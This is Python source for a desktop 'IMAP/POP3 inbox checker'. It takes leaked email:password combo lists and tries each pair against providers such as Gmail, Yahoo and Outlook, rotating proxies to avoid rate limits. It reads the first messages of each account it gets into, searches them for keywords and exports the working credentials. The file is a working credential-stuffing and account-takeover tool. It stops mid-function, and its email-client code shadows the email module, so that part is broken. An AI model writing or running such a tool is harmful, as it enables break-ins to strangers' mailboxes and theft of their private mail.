import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import threading
import queue
import imaplib
import poplib
import email
from email.header import decode_header
import ssl
import time
from datetime import datetime
import re
import os
import webbrowser
import socket
import socks
from typing import List, Dict, Tuple, Optional
import base64
import html
from tkinterhtml import HtmlFrame

class EmailChecker:
    def __init__(self, root):
        self.root = root
        self.root.title("IMAP/POP3 Inbox Checker with Email Client")
        self.root.geometry("1400x900")
        self.root.resizable(True, True)
        
        # Variables
        self.combos = []
        self.proxies = []
        self.results = []
        self.is_checking = False
        self.keywords = []
        self.processed_count = 0
        self.valid_count = 0
        self.current_proxy_index = 0
        self.proxy_type = "HTTP"  # Default proxy type
        self.use_proxy = tk.BooleanVar(value=True)
        self.check_both_protocols = tk.BooleanVar(value=False)
        self.current_email_client = None
        
        # Setup GUI
        self.setup_gui()
        
        # Results queue for thread-safe GUI updates
        self.queue = queue.Queue()
        self.process_queue()
    
    def setup_gui(self):
        # Configure style
        style = ttk.Style()
        style.configure('TFrame', background='#f0f0f0')
        style.configure('TLabel', background='#f0f0f0', font=('Arial', 10))
        style.configure('TButton', font=('Arial', 10))
        style.configure('Header.TLabel', font=('Arial', 12, 'bold'))
        style.configure('TCombobox', font=('Arial', 10))
        
        # Create notebook for tabs
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Checker tab
        self.checker_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.checker_frame, text="Email Checker")
        
        # Email Client tab
        self.client_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.client_frame, text="Email Client")
        
        # Setup checker tab
        self.setup_checker_tab()
        
        # Setup email client tab
        self.setup_email_client_tab()
    
    def setup_checker_tab(self):
        # Main frame
        main_frame = ttk.Frame(self.checker_frame, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure grid weights
        self.checker_frame.columnconfigure(0, weight=1)
        self.checker_frame.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(7, weight=1)
        
        # Title
        title_label = ttk.Label(main_frame, text="IMAP/POP3 Inbox Checker", style='Header.TLabel')
        title_label.grid(row=0, column=0, columnspan=4, pady=(0, 10))
        
        # Protocol selection
        ttk.Label(main_frame, text="Protocol:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.protocol_var = tk.StringVar(value="IMAP")
        protocol_combo = ttk.Combobox(main_frame, textvariable=self.protocol_var, values=["IMAP", "POP3"], state="readonly", width=10)
        protocol_combo.grid(row=1, column=1, sticky=tk.W, padx=5, pady=5)
        
        # Check both protocols option
        ttk.Checkbutton(main_frame, text="Check Both Protocols", variable=self.check_both_protocols).grid(row=1, column=2, sticky=tk.W, padx=5, pady=5)
        
        # Use proxy option
        ttk.Checkbutton(main_frame, text="Use Proxy", variable=self.use_proxy).grid(row=1, column=3, sticky=tk.W, padx=5, pady=5)
        
        # Proxy type selection
        ttk.Label(main_frame, text="Proxy Type:").grid(row=2, column=0, sticky=tk.W, pady=5)
        self.proxy_type_var = tk.StringVar(value="HTTP")
        proxy_type_combo = ttk.Combobox(main_frame, textvariable=self.proxy_type_var, 
                                       values=["HTTP", "SOCKS4", "SOCKS5"], state="readonly", width=10)
        proxy_type_combo.grid(row=2, column=1, sticky=tk.W, padx=5, pady=5)
        
        # Combo file selection
        ttk.Label(main_frame, text="Combo File:").grid(row=3, column=0, sticky=tk.W, pady=5)
        self.combo_path = tk.StringVar()
        ttk.Entry(main_frame, textvariable=self.combo_path, width=50).grid(row=3, column=1, sticky=(tk.W, tk.E), padx=5, pady=5)
        ttk.Button(main_frame, text="Browse", command=self.load_combos).grid(row=3, column=2, padx=5, pady=5)
        
        # Proxy file selection
        ttk.Label(main_frame, text="Proxy File:").grid(row=4, column=0, sticky=tk.W, pady=5)
        self.proxy_path = tk.StringVar()
        ttk.Entry(main_frame, textvariable=self.proxy_path, width=50).grid(row=4, column=1, sticky=(tk.W, tk.E), padx=5, pady=5)
        ttk.Button(main_frame, text="Browse", command=self.load_proxies).grid(row=4, column=2, padx=5, pady=5)
        
        # Keywords frame
        keywords_frame = ttk.Frame(main_frame)
        keywords_frame.grid(row=5, column=0, columnspan=4, sticky=(tk.W, tk.E), pady=5)
        
        ttk.Label(keywords_frame, text="Keywords (comma-separated):").grid(row=0, column=0, sticky=tk.W)
        self.keywords_var = tk.StringVar()
        self.keywords_entry = ttk.Entry(keywords_frame, textvariable=self.keywords_var, width=50)
        self.keywords_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=5)
        keywords_frame.columnconfigure(1, weight=1)
        
        # Controls frame
        controls_frame = ttk.Frame(main_frame)
        controls_frame.grid(row=6, column=0, columnspan=4, pady=10)
        
        ttk.Button(controls_frame, text="Start Check", command=self.start_check).pack(side=tk.LEFT, padx=5)
        ttk.Button(controls_frame, text="Stop Check", command=self.stop_check).pack(side=tk.LEFT, padx=5)
        ttk.Button(controls_frame, text="Clear Results", command=self.clear_results).pack(side=tk.LEFT, padx=5)
        ttk.Button(controls_frame, text="Export Results", command=self.export_results).pack(side=tk.LEFT, padx=5)
        
        # Progress frame
        progress_frame = ttk.Frame(main_frame)
        progress_frame.grid(row=7, column=0, columnspan=4, sticky=(tk.W, tk.E), pady=5)
        
        ttk.Label(progress_frame, text="Progress:").pack(side=tk.LEFT)
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(progress_frame, variable=self.progress_var, maximum=100)
        self.progress_bar.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        self.status_label = ttk.Label(progress_frame, text="Ready")
        self.status_label.pack(side=tk.RIGHT)
        
        # Results treeview with scrollbar
        tree_frame = ttk.Frame(main_frame)
        tree_frame.grid(row=8, column=0, columnspan=4, sticky=(tk.W, tk.E, tk.N, tk.S), pady=5)
        tree_frame.columnconfigure(0, weight=1)
        tree_frame.rowconfigure(0, weight=1)
        
        columns = ("address", "password", "protocol", "request", "found", "actions")
        self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings", height=15)
        
        # Define headings
        self.tree.heading("address", text="ADDRESS")
        self.tree.heading("password", text="PASSWORD")
        self.tree.heading("protocol", text="PROTOCOL")
        self.tree.heading("request", text="REQUEST")
        self.tree.heading("found", text="FOUND")
        self.tree.heading("actions", text="ACTIONS")
        
        # Define columns
        self.tree.column("address", width=200)
        self.tree.column("password", width=150)
        self.tree.column("protocol", width=100)
        self.tree.column("request", width=150)
        self.tree.column("found", width=250)
        self.tree.column("actions", width=100)
        
        # Scrollbar for treeview
        tree_scroll = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.tree.yview)
        self.tree.configure(yscrollcommand=tree_scroll.set)
        
        self.tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        tree_scroll.grid(row=0, column=1, sticky=(tk.N, tk.S))
        
        # Bind double-click event
        self.tree.bind("<Double-1>", self.on_tree_double_click)
        
        # Log area
        ttk.Label(main_frame, text="Log:").grid(row=9, column=0, sticky=tk.W, pady=(10, 0))
        self.log_area = scrolledtext.ScrolledText(main_frame, height=10)
        self.log_area.grid(row=10, column=0, columnspan=4, sticky=(tk.W, tk.E, tk.N, tk.S), pady=5)
    
    def setup_email_client_tab(self):
        # Main frame
        main_frame = ttk.Frame(self.client_frame, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure grid weights
        self.client_frame.columnconfigure(0, weight=1)
        self.client_frame.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(3, weight=1)
        
        # Title
        title_label = ttk.Label(main_frame, text="Email Client", style='Header.TLabel')
        title_label.grid(row=0, column=0, columnspan=2, pady=(0, 10))
        
        # Login frame
        login_frame = ttk.Frame(main_frame)
        login_frame.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=5)
        
        ttk.Label(login_frame, text="Email:").grid(row=0, column=0, sticky=tk.W, padx=5)
        self.client_email = tk.StringVar()
        ttk.Entry(login_frame, textvariable=self.client_email, width=30).grid(row=0, column=1, sticky=(tk.W, tk.E), padx=5)
        
        ttk.Label(login_frame, text="Password:").grid(row=0, column=2, sticky=tk.W, padx=5)
        self.client_password = tk.StringVar()
        ttk.Entry(login_frame, textvariable=self.client_password, width=30, show="*").grid(row=0, column=3, sticky=(tk.W, tk.E), padx=5)
        
        ttk.Label(login_frame, text="Protocol:").grid(row=0, column=4, sticky=tk.W, padx=5)
        self.client_protocol = tk.StringVar(value="IMAP")
        ttk.Combobox(login_frame, textvariable=self.client_protocol, values=["IMAP", "POP3"], state="readonly", width=10).grid(row=0, column=5, padx=5)
        
        ttk.Button(login_frame, text="Connect", command=self.connect_email_client).grid(row=0, column=6, padx=5)
        
        login_frame.columnconfigure(1, weight=1)
        login_frame.columnconfigure(3, weight=1)
        
        # Email list frame
        list_frame = ttk.Frame(main_frame)
        list_frame.grid(row=2, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), pady=5)
        list_frame.columnconfigure(0, weight=1)
        list_frame.rowconfigure(0, weight=1)
        
        # Email list
        columns = ("from", "subject", "date")
        self.email_tree = ttk.Treeview(list_frame, columns=columns, show="headings", height=15)
        
        # Define headings
        self.email_tree.heading("from", text="From")
        self.email_tree.heading("subject", text="Subject")
        self.email_tree.heading("date", text="Date")
        
        # Define columns
        self.email_tree.column("from", width=200)
        self.email_tree.column("subject", width=300)
        self.email_tree.column("date", width=150)
        
        # Scrollbar for email treeview
        email_tree_scroll = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.email_tree.yview)
        self.email_tree.configure(yscrollcommand=email_tree_scroll.set)
        
        self.email_tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        email_tree_scroll.grid(row=0, column=1, sticky=(tk.N, tk.S))
        
        # Bind click event to email list
        self.email_tree.bind("<Double-1>", self.on_email_select)
        
        # Email content frame
        content_frame = ttk.Frame(main_frame)
        content_frame.grid(row=3, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), pady=5)
        content_frame.columnconfigure(0, weight=1)
        content_frame.rowconfigure(0, weight=1)
        
        # Email content display
        self.email_content = scrolledtext.ScrolledText(content_frame, height=15)
        self.email_content.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
    
    def load_combos(self):
        file_path = filedialog.askopenfilename(
            title="Select Combo File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if file_path:
            self.combo_path.set(file_path)
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    self.combos = [line.strip() for line in f if line.strip()]
                self.log(f"Loaded {len(self.combos)} combos from {file_path}")
                
                # Extract and log unique domains
                domains = set()
                for combo in self.combos:
                    if '@' in combo:
                        email_part = combo.split(':', 1)[0] if ':' in combo else combo.split('|', 1)[0] if '|' in combo else combo
                        domain = email_part.split('@')[-1].strip()
                        domains.add(domain)
                
                self.log(f"Found {len(domains)} unique domains: {', '.join(sorted(domains))}")
                
            except Exception as e:
                self.log(f"Error loading combos: {str(e)}")
    
    def load_proxies(self):
        file_path = filedialog.askopenfilename(
            title="Select Proxy File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if file_path:
            self.proxy_path.set(file_path)
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                self.log(f"Loaded {len(self.proxies)} proxies from {file_path}")
            except Exception as e:
                self.log(f"Error loading proxies: {str(e)}")
    
    def start_check(self):
        if not self.combos:
            messagebox.showwarning("Warning", "Please load combo file first!")
            return
        
        if self.is_checking:
            messagebox.showwarning("Warning", "Check is already in progress!")
            return
        
        # Parse keywords
        keywords_text = self.keywords_var.get().strip()
        if keywords_text:
            self.keywords = [k.strip() for k in keywords_text.split(',') if k.strip()]
        else:
            self.keywords = []
            
        # Get protocol and proxy type
        self.protocol = self.protocol_var.get()
        self.proxy_type = self.proxy_type_var.get()
        
        self.is_checking = True
        self.processed_count = 0
        self.valid_count = 0
        self.results = []
        self.current_proxy_index = 0
        
        # Clear previous results
        for item in self.tree.get_children():
            self.tree.delete(item)
        
        # Start checking in a separate thread
        thread = threading.Thread(target=self.check_combos)
        thread.daemon = True
        thread.start()
        
        self.log(f"Started checking combos using {self.protocol} protocol...")
    
    def stop_check(self):
        self.is_checking = False
        self.log("Stopping check...")
    
    def clear_results(self):
        for item in self.tree.get_children():
            self.tree.delete(item)
        self.log_area.delete(1.0, tk.END)
        self.log("Cleared results and log.")
    
    def export_results(self):
        if not self.results:
            messagebox.showwarning("Warning", "No results to export!")
            return
        
        file_path = filedialog.asksaveasfilename(
            title="Save Results",
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write("ADDRESS | PASSWORD | PROTOCOL | REQUEST | FOUND\n")
                    for result in self.results:
                        f.write(f"{result['address']} | {result['password']} | {result['protocol']} | {result['request']} | {result['found']}\n")
                self.log(f"Results exported to {file_path}")
            except Exception as e:
                self.log(f"Error exporting results: {str(e)}")
    
    def check_combos(self):
        total = len(self.combos)
        
        for i, combo in enumerate(self.combos):
            if not self.is_checking:
                break
            
            # Parse combo (format: email:password or email|password)
            if ':' in combo:
                address, password = combo.split(':', 1)
            elif '|' in combo:
                address, password = combo.split('|', 1)
            else:
                self.queue.put(('log', f"Invalid combo format: {combo}"))
                continue
            
            address = address.strip()
            password = password.strip()
            
            # Get domain from email
            domain = address.split('@')[-1] if '@' in address else ''
            
            # Determine which protocols to check
            protocols_to_check = []
            if self.check_both_protocols.get():
                protocols_to_check = ["IMAP", "POP3"]
            else:
                protocols_to_check = [self.protocol]
            
            for protocol in protocols_to_check:
                if not self.is_checking:
                    break
                
                # Try to determine server from domain
                if protocol == "IMAP":
                    server = self.get_imap_server(domain)
                else:
                    server = self.get_pop3_server(domain)
                
                if not server:
                    self.queue.put(('result', {
                        'address': address,
                        'password': password,
                        'protocol': protocol,
                        'request': 'SKIP',
                        'found': 'Unknown domain',
                        'valid': False
                    }))
                    continue
                
                # Try to connect and check inbox
                if protocol == "IMAP":
                    success, message, found_items = self.check_imap(address, password, server)
                else:
                    success, message, found_items = self.check_pop3(address, password, server)
                
                self.queue.put(('result', {
                    'address': address,
                    'password': password,
                    'protocol': protocol,
                    'request': 'SUCCESS' if success else 'FAILED',
                    'found': ', '.join(found_items) if found_items else message,
                    'valid': success
                }))
                
                self.processed_count += 1
                if success:
                    self.valid_count += 1
                
                # Update progress
                progress = (self.processed_count / (total * len(protocols_to_check))) * 100
                self.queue.put(('progress', progress))
                
                # Small delay to avoid rate limiting
                time.sleep(0.1)
        
        self.is_checking = False
        self.queue.put(('status', f"Completed. Valid: {self.valid_count}/{self.processed_count}"))
        self.queue.put(('log', f"Check completed. Valid: {self.valid_count}/{self.processed_count}"))
    
    def get_next_proxy(self):
        if not self.proxies or not self.use_proxy.get():
            return None
            
        if self.current_proxy_index >= len(self.proxies):
            self.current_proxy_index = 0
            
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index += 1
        
        return proxy
    
    def setup_proxy(self, proxy_str):
        if not proxy_str or not self.use_proxy.get():
            return None
            
        try:
            # Parse proxy (format: ip:port or user:pass@ip:port)
            if '@' in proxy_str:
                auth, hostport = proxy_str.split('@', 1)
                username, password = auth.split(':', 1) if ':' in auth else (auth, None)
                host, port = hostport.split(':', 1)
            else:
                username, password = None, None
                host, port = proxy_str.split(':', 1)
                
            port = int(port)
            
            # Set proxy based on type
            if self.proxy_type == "SOCKS4":
                socks.set_default_proxy(socks.SOCKS4, host, port, username=username, password=password)
            elif self.proxy_type == "SOCKS5":
                socks.set_default_proxy(socks.SOCKS5, host, port, username=username, password=password)
            else:  # HTTP
                socks.set_default_proxy(socks.HTTP, host, port, username=username, password=password)
                
            socket.socket = socks.socksocket
            return True
            
        except Exception as e:
            self.log(f"Error setting up proxy {proxy_str}: {str(e)}")
            return False
    
    def remove_proxy(self):
        socks.set_default_proxy()
        socket.socket = socks.socksocket
    
    def get_imap_server(self, domain):
        # Enhanced IMAP server mapping with correct server addresses
        imap_servers = {
            'charter.net': 'mobile.charter.net',
            'comcast.net': 'imap.comcast.net',
            'optonline.net': 'mail.optonline.net',
            'optimum.net': 'mail.optimum.net',
            'earthlink.net': 'imap.earthlink.net',
            'roadrunner.com': 'imap.roadrunner.com',
            'twc.com': 'mail.twc.com',
            'adelphia.net': 'imap.adelphia.net',
            'windstream.net': 'imap.windstream.net',
            'zoominternet.net': 'mail.zoominternet.net',
            'atlanticbb.net': 'mail.atlanticbb.net',
            'rcn.com': 'imap.rcn.com',
            'ptd.net': 'mail.ptd.net',
            'suddenlink.net': 'mail.suddenlink.net',
            'peoplepc.com': 'mail.peoplepc.com',
            'centurylink.net': 'imap.centurylink.net',
            'bresnan.net': 'mail.bresnan.net',
            'tds.net': 'mail.tds.net',
            'knology.net': 'mail.knology.net',
            'hawaii.rr.com': 'mail.hawaii.rr.com',
            'hawaiiantel.net': 'mail.hawaiiantel.net',
            'sccoast.net': 'mail.sccoast.net',
            'neo.rr.com': 'mail.neo.rr.com',
            'cfl.rr.com': 'mail.cfl.rr.com',
            'nc.rr.com': 'mail.nc.rr.com',
            'triad.rr.com': 'mail.triad.rr.com',
            'nycap.rr.com': 'mail.nycap.rr.com',
            'tampabay.rr.com': 'mail.tampabay.rr.com',
            'carolina.rr.com': 'mail.carolina.rr.com',
            'rochester.rr.com': 'mail.rochester.rr.com',
            'san.rr.com': 'mail.san.rr.com',
            'austin.rr.com': 'mail.austin.rr.com',
            'stny.rr.com': 'mail.stny.rr.com',
            'twcny.rr.com': 'mail.twcny.rr.com',
            'wi.rr.com': 'mail.wi.rr.com',
            'stx.rr.com': 'mail.stx.rr.com',
            'tx.rr.com': 'mail.tx.rr.com',
            'kc.rr.com': 'mail.kc.rr.com',
            'oh.rr.com': 'mail.oh.rr.com',
            'sc.rr.com': 'mail.sc.rr.com',
            'ec.rr.com': 'mail.ec.rr.com',
            'rgv.rr.com': 'mail.rgv.rr.com',
            'pa.rr.com': 'mail.pa.rr.com',
            'elp.rr.com': 'mail.elp.rr.com',
            'eufaula.rr.com': 'mail.eufaula.rr.com',
            'hvc.rr.com': 'mail.hvc.rr.com',
            'woh.rr.com': 'mail.woh.rr.com',
            'dc.rr.com': 'mail.dc.rr.com',
            'columbus.rr.com': 'mail.columbus.rr.com',
            'bham.rr.com': 'mail.bham.rr.com',
            'satx.rr.com': 'mail.satx.rr.com',
            'ca.rr.com': 'mail.ca.rr.com',
            'gt.rr.com': 'mail.gt.rr.com',
            'wavecable.com': 'mail.wavecable.com',
            'btinternet.com': 'mail.btinternet.com',
            'email.com': 'mail.email.com',
            'ix.netcom.com': 'mail.ix.netcom.com',
            'gmail.com': 'imap.gmail.com',
            'yahoo.com': 'imap.mail.yahoo.com',
            'outlook.com': 'imap-mail.outlook.com',
            'hotmail.com': 'imap-mail.outlook.com',
            'aol.com': 'imap.aol.com',
            'icloud.com': 'imap.mail.me.com'
        }
        
        # For any rr.com subdomain, try to use the appropriate regional server
        if domain.endswith('.rr.com') and domain not in imap_servers:
            # Extract the regional prefix
            regional_prefix = domain.split('.')[0]
            # Try to find a matching regional server
            for rr_domain, server in imap_servers.items():
                if rr_domain.endswith('.rr.com') and rr_domain.startswith(regional_prefix):
                    return server
            # If no specific regional server found, try a generic approach
            return f"mail.{domain}"
        
        return imap_servers.get(domain.lower(), f"mail.{domain}")
    
    def get_pop3_server(self, domain):
        # Enhanced POP3 server mapping with correct server addresses
        pop3_servers = {
            'charter.net': 'mobile.charter.net',
            'comcast.net': 'pop.comcast.net',
            'optonline.net': 'mail.optonline.net',
            'optimum.net': 'mail.optimum.net',
            'earthlink.net': 'pop.earthlink.net',
            'roadrunner.com': 'pop.roadrunner.com',
            'twc.com': 'mail.twc.com',
            'adelphia.net': 'pop.adelphia.net',
            'windstream.net': 'pop.windstream.net',
            'zoominternet.net': 'mail.zoominternet.net',
            'atlanticbb.net': 'mail.atlanticbb.net',
            'rcn.com': 'pop.rcn.com',
            'ptd.net': 'mail.ptd.net',
            'suddenlink.net': 'mail.suddenlink.net',
            'peoplepc.com': 'mail.peoplepc.com',
            'centurylink.net': 'pop.centurylink.net',
            'bresnan.net': 'mail.bresnan.net',
            'tds.net': 'mail.tds.net',
            'knology.net': 'mail.knology.net',
            'hawaii.rr.com': 'mail.hawaii.rr.com',
            'hawaiiantel.net': 'mail.hawaiiantel.net',
            'sccoast.net': 'mail.sccoast.net',
            'neo.rr.com': 'mail.neo.rr.com',
            'cfl.rr.com': 'mail.cfl.rr.com',
            'nc.rr.com': 'mail.nc.rr.com',
            'triad.rr.com': 'mail.triad.rr.com',
            'nycap.rr.com': 'mail.nycap.rr.com',
            'tampabay.rr.com': 'mail.tampabay.rr.com',
            'carolina.rr.com': 'mail.carolina.rr.com',
            'rochester.rr.com': 'mail.rochester.rr.com',
            'san.rr.com': 'mail.san.rr.com',
            'austin.rr.com': 'mail.austin.rr.com',
            'stny.rr.com': 'mail.stny.rr.com',
            'twcny.rr.com': 'mail.twcny.rr.com',
            'wi.rr.com': 'mail.wi.rr.com',
            'stx.rr.com': 'mail.stx.rr.com',
            'tx.rr.com': 'mail.tx.rr.com',
            'kc.rr.com': 'mail.kc.rr.com',
            'oh.rr.com': 'mail.oh.rr.com',
            'sc.rr.com': 'mail.sc.rr.com',
            'ec.rr.com': 'mail.ec.rr.com',
            'rgv.rr.com': 'mail.rgv.rr.com',
            'pa.rr.com': 'mail.pa.rr.com',
            'elp.rr.com': 'mail.elp.rr.com',
            'eufaula.rr.com': 'mail.eufaula.rr.com',
            'hvc.rr.com': 'mail.hvc.rr.com',
            'woh.rr.com': 'mail.woh.rr.com',
            'dc.rr.com': 'mail.dc.rr.com',
            'columbus.rr.com': 'mail.columbus.rr.com',
            'bham.rr.com': 'mail.bham.rr.com',
            'satx.rr.com': 'mail.satx.rr.com',
            'ca.rr.com': 'mail.ca.rr.com',
            'gt.rr.com': 'mail.gt.rr.com',
            'wavecable.com': 'mail.wavecable.com',
            'btinternet.com': 'mail.btinternet.com',
            'email.com': 'mail.email.com',
            'ix.netcom.com': 'mail.ix.netcom.com',
            'gmail.com': 'pop.gmail.com',
            'yahoo.com': 'pop.mail.yahoo.com',
            'outlook.com': 'pop-mail.outlook.com',
            'hotmail.com': 'pop-mail.outlook.com',
            'aol.com': 'pop.aol.com'
        }
        
        # For any rr.com subdomain, try to use the appropriate regional server
        if domain.endswith('.rr.com') and domain not in pop3_servers:
            # Extract the regional prefix
            regional_prefix = domain.split('.')[0]
            # Try to find a matching regional server
            for rr_domain, server in pop3_servers.items():
                if rr_domain.endswith('.rr.com') and rr_domain.startswith(regional_prefix):
                    return server
            # If no specific regional server found, try a generic approach
            return f"mail.{domain}"
        
        return pop3_servers.get(domain.lower(), f"mail.{domain}")
    
    def check_imap(self, address, password, imap_server):
        found_items = []
        proxy_used = None
        
        try:
            # Setup proxy if available
            proxy_str = self.get_next_proxy()
            if proxy_str:
                if self.setup_proxy(proxy_str):
                    proxy_used = proxy_str
                    self.log(f"Using proxy: {proxy_str}")
            
            # Create SSL context
            context = ssl.create_default_context()
            
            # Connect to server with timeout
            mail = imaplib.IMAP4_SSL(imap_server, 993, ssl_context=context)
            mail.timeout = 30  # Set timeout to 30 seconds
            
            # Login
            mail.login(address, password)
            
            # Select inbox
            mail.select('inbox')
            
            # Search for all emails
            status, messages = mail.search(None, 'ALL')
            
            if status == 'OK':
                email_ids = messages[0].split()
                
                # Limit to first 10 emails to avoid timeout
                for num in email_ids[:10]:
                    # Fetch the email
                    status, data = mail.fetch(num, '(RFC822)')
                    
                    if status == 'OK':
                        # Parse email content
                        msg = email.message_from_bytes(data[0][1])
                        
                        # Check subject and from fields
                        subject, encoding = decode_header(msg["Subject"])[0] if msg["Subject"] else ("", None)
                        if isinstance(subject, bytes):
                            subject = subject.decode(encoding if encoding else 'utf-8')
                        
                        from_, encoding = decode_header(msg.get("From"))[0] if msg.get("From") else ("", None)
                        if isinstance(from_, bytes):
                            from_ = from_.decode(encoding if encoding else 'utf-8')
                        
                        # Check for keywords in subject
                        for keyword in self.keywords:
                            if keyword.lower() in subject.lower():
                                found_items.append(f"Subject: {keyword}")
                        
                        # Check for keywords in sender
                        for keyword in self.keywords:
                            if keyword.lower() in from_.lower():
                                found_items.append(f"From: {keyword}")
                        
                        # Check email body
                        if msg.is_multipart():
                            for part in msg.walk():
                                content_type = part.get_content_type()
                                content_disposition = str(part.get("Content-Disposition"))
                                
                                if content_type == "text/plain" and "attachment" not in content_disposition:
                                    try:
                                        body = part.get_payload(decode=True).decode()
                                        for keyword in self.keywords:
                                            if keyword.lower() in body.lower():
                                                found_items.append(f"Body: {keyword}")
                                    except:
                                        pass  # Skip if can't decode
                        else:
                            try:
                                body = msg.get_payload(decode=True).decode()
                                for keyword in self.keywords:
                                    if keyword.lower() in body.lower():
                                        found_items.append(f"Body: {keyword}")
                            except:
                                pass  # Skip if can't decode
                
                # Remove duplicates
                found_items = list(set(found_items))
                
                # Logout
                mail.logout()
                
                # Remove proxy
                if proxy_used:
                    self.remove_proxy()
                
                return True, "Connected", found_items
            else:
                mail.logout()
                if proxy_used:
                    self.remove_proxy()
                return False, "No emails found", []
                
        except imaplib.IMAP4.error as e:
            if proxy_used:
                self.remove_proxy()
            return False, f"Auth error: {str(e)}", []
        except Exception as e:
            if proxy_used:
                self.remove_proxy()
            return False, f"Error: {str(e)}", []
    
    def check_pop3(self, address, password, pop3_server):
        found_items = []
        proxy_used = None
        
        try:
            # Setup proxy if available
            proxy_str = self.get_next_proxy()
            if proxy_str:
                if self.setup_proxy(proxy_str):
                    proxy_used = proxy_str
                    self.log(f"Using proxy: {proxy_str}")
            
            # Connect to server
            if pop3_server == 'pop.gmail.com' or pop3_server.endswith('gmail.com'):
                # Gmail requires SSL
                mail = poplib.POP3_SSL(pop3_server, 995)
            else:
                mail = poplib.POP3(pop3_server, 110)
                # Upgrade to SSL if available
                try:
                    mail.stls()
                except:
                    pass  # Server may not support STLS
            
            # Login
            mail.user(address)
            mail.pass_(password)
            
            # Get email count
            num_messages = len(mail.list()[1])
            
            # Limit to first 5 emails to avoid timeout
            for i in range(1, min(6, num_messages + 1)):
                # Retrieve email
                response, lines, octets = mail.retr(i)
                
                # Parse email content
                msg_content = b'\r\n'.join(lines).decode('utf-8', errors='ignore')
                msg = email.message_from_string(msg_content)
                
                # Check subject and from fields
                subject, encoding = decode_header(msg["Subject"])[0] if msg["Subject"] else ("", None)
                if isinstance(subject, bytes):
                    subject = subject.decode(encoding if encoding else 'utf-8')
                
                from_, encoding = decode_header(msg.get("From"))[0] if msg.get("From") else ("", None)
                if isinstance(from_, bytes):
                    from_ = from_.decode(encoding if encoding else 'utf-8')
                
                # Check for keywords in subject
                for keyword in self.keywords:
                    if keyword.lower() in subject.lower():
                        found_items.append(f"Subject: {keyword}")
                
                # Check for keywords in sender
                for keyword in self.keywords:
                    if keyword.lower() in from_.lower():
                        found_items.append(f"From: {keyword}")
                
                # Check email body
                if msg.is_multipart():
                    for part in msg.walk():
                        content_type = part.get_content_type()
                        content_disposition = str(part.get("Content-Disposition"))
                        
                        if content_type == "text/plain" and "attachment" not in content_disposition:
                            try:
                                body = part.get_payload(decode=True).decode()
                                for keyword in self.keywords:
                                    if keyword.lower() in body.lower():
                                        found_items.append(f"Body: {keyword}")
                            except:
                                pass  # Skip if can't decode
                else:
                    try:
                        body = msg.get_payload(decode=True).decode()
                        for keyword in self.keywords:
                            if keyword.lower() in body.lower():
                                found_items.append(f"Body: {keyword}")
                    except:
                        pass  # Skip if can't decode
            
            # Remove duplicates
            found_items = list(set(found_items))
            
            # Quit
            mail.quit()
            
            # Remove proxy
            if proxy_used:
                self.remove_proxy()
            
            return True, "Connected", found_items
                    
        except poplib.error_proto as e:
            if proxy_used:
                self.remove_proxy()
            return False, f"Auth error: {str(e)}", []
        except Exception as e:
            if proxy_used:
                self.remove_proxy()
            return False, f"Error: {str(e)}", []
    
    def connect_email_client(self):
        email = self.client_email.get().strip()
        password = self.client_password.get().strip()
        protocol = self.client_protocol.get()
        
        if not email or not password:
            messagebox.showerror("Error", "Please enter email and password")
            return
        
        domain = email.split('@')[-1] if '@' in email else ''
        
        # Determine server
        if protocol == "IMAP":
            server = self.get_imap_server(domain)
        else:
            server = self.get_pop3_server(domain)
        
        if not server:
            messagebox.showerror("Error", f"Unknown domain: {domain}")
            return
        
        # Try to connect in a separate thread
        thread = threading.Thread(target=self.connect_to_email, args=(email, password, protocol, server))
        thread.daemon = True
        thread.start()
    
    def connect_to_email(self, email, password, protocol, server):
        try:
            if protocol == "IMAP":
                # Connect to IMAP
                context = ssl.create_default_context()
                mail = imaplib.IMAP4_SSL(server, 993, ssl_context=context)
                mail.timeout = 30
                mail.login(email, password)
                mail.select('inbox')
                
                # Search for all emails
                status, messages = mail.search(None, 'ALL')
                
                if status == 'OK':
                    email_ids = messages[0].split()
                    
                    # Clear email list
                    self.email_tree.delete(*self.email_tree.get_children())
                    
                    # Get first 20 emails
                    for num in email_ids[:20]:
                        status, data = mail.fetch(num, '(RFC822)')
                        
                        if status == 'OK':
                            msg = email.message_from_bytes(data[0][1])
                            
                            # Get email details
                            subject, encoding = decode_header(msg["Subject"])[0] if msg["Subject"] else ("No Subject", None)
                            if isinstance(subject, bytes):
                                subject = subject.decode(encoding if encoding else 'utf-8')
                            
                            from_, encoding = decode_header(msg.get("From"))[0] if msg.get("From") else ("Unknown", None)
